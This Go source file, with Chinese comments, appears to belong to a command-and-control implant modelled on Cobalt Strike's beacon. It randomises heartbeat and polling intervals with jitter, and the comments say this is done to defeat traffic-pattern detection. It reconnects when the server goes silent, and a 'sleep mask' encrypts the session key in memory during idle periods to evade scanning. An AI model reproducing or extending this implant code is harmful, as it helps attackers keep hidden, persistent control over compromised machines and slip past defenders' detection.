package app

import (
	"encoding/binary"
	"implant/core/config"
	"implant/core/encrypt"
	"implant/core/sleepmask"
	"math/rand"
	"time"
)

// 【统一心跳(CS 模型)】beacon 节奏单一事实来源 = config.WaitTime(sleep 秒) + jitter%。
// 心跳 ticker、轮询间隔、RecvDeadline 全部由下方函数派生：
//   - NextInterval():  sleep × (1 + U(-j%, +j%))，逐拍重算
//   - RecvDeadline():  2 × sleep × (1+j%) + 5s
//   - SLEEP 命令改 config.WaitTime 后，以上全部即时跟随

// jitterFraction 返回当前抖动比例（0-0.5，钳制）
func jitterFraction() float64 {
	jp := config.ReconnectConfig.JitterPercent
	if jp > config.ReconnectConfig.MaxJitterPercent {
		jp = config.ReconnectConfig.MaxJitterPercent
	}
	if jp < 0 {
		jp = 0
	}
	return float64(jp) / 100.0
}

// baseSleep 当前 sleep 基准（SLEEP 命令可运行时调整）；无效时回退 5s
func baseSleep() time.Duration {
	if config.WaitTime > 0 {
		return config.WaitTime
	}
	return 5 * time.Second
}

// NextInterval 下一拍间隔：sleep × (1 + U(-j%, +j%))。
// 心跳与轮询共用，打破固定周期流量特征（CS sleep+jitter 语义）。
func NextInterval() time.Duration {
	return Jittered(baseSleep())
}

// Jittered 对任意基准间隔施加当前抖动：d × (1 + U(-j%, +j%))
func Jittered(d time.Duration) time.Duration {
	if d <= 0 {
		d = 5 * time.Second
	}
	j := jitterFraction()
	if j <= 0 {
		return d
	}
	spread := float64(d) * j
	delta := (rand.Float64()*2 - 1) * spread
	out := d + time.Duration(delta)
	if out < 100*time.Millisecond {
		out = 100 * time.Millisecond
	}
	return out
}

// RecvDeadline 客户端单次 Recv 的读超时：2×最坏拍间隔 + 5s 余量。
// 服务端对每个心跳包回复 ack，健康连接读侧持续有数据，不会触发超时；
// 服务端静默死亡（黑洞网络，无 FIN/RST）时超时立即触发，重连而非永久卡死。
func RecvDeadline() time.Duration {
	worst := float64(baseSleep()) * (1 + jitterFraction())
	return time.Duration(2*worst)*time.Second + 5*time.Second
}

// HeartbeatLoop 心跳循环：每拍按 NextInterval() 重算间隔（jitter 参与心跳节奏），
// stop 关闭时退出。替代原固定间隔 ticker（流量周期性特征）。
func HeartbeatLoop(stop <-chan struct{}, send func()) {
	for {
		timer := time.NewTimer(NextInterval())
		select {
		case <-timer.C:
			send()
		case <-stop:
			timer.Stop()
			return
		}
	}
}

// IsHeartbeatAck 判断解密后的命令是否为心跳 ack（type=3 空载荷）：
// 仅作存活探测，非业务命令，应丢弃。
func IsHeartbeatAck(decrypted []byte) bool {
	return len(decrypted) == 4 && binary.BigEndian.Uint32(decrypted) == 3
}

// SleepWithJitter 按 config.WaitTime + 抖动休眠（持久传输空闲路径）；WaitTime<=0 时随机休眠。
func SleepWithJitter(r *rand.Rand) {
	if config.WaitTime > 0 {
		d := NextInterval()
		time.Sleep(d)
		return
	}
	time.Sleep(time.Duration(r.Intn(5000)) * time.Millisecond)
}

// SleepMask 在睡眠期间加密会话密钥（B9 sleep mask）。d 为睡眠时长。
// 仅在 beacon 空闲睡眠期（http/oss 轮询间隔）调用，期间无其它 goroutine 访问会话密钥。
// 会话密钥不存在时仅睡眠。
// 注意：sleepmask 会对传入的 key 做就地 XOR（加密->睡眠->还原）。
// GetSessionKey 已返回拷贝（防污染全局会话密钥，曾导致命令结果加密错钥、服务端 GCM 认证失败），
// 直接传入即可，无需再拷贝。
func SleepMask(d time.Duration) {
	key, err := encrypt.GlobalClientKeyManager.GetSessionKey()
	if err != nil || len(key) == 0 {
		time.Sleep(d)
		return
	}
	sleepmask.SleepWithMask(d, key)
}
